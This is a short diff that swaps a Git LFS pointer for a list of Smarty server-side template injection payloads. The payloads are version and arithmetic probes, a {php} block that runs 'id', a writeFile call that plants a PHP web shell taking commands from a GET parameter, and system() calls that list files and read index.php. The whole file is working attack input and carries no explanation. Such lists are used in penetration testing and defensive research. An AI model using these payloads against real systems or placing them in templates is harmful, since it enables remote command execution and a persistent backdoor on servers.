@@ -1,3 +1,6 @@
-version https://git-lfs.github.com/spec/v1
-oid sha256:d867688b15f321bd63e938e4966e116a8e44c63dfff3ca599f83623bb418c98c
-size 200
+{$smarty.version}
+${7*7}
+{php}echo `id`;{/php} 
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{system('ls')} 
+{system('cat index.php')} 
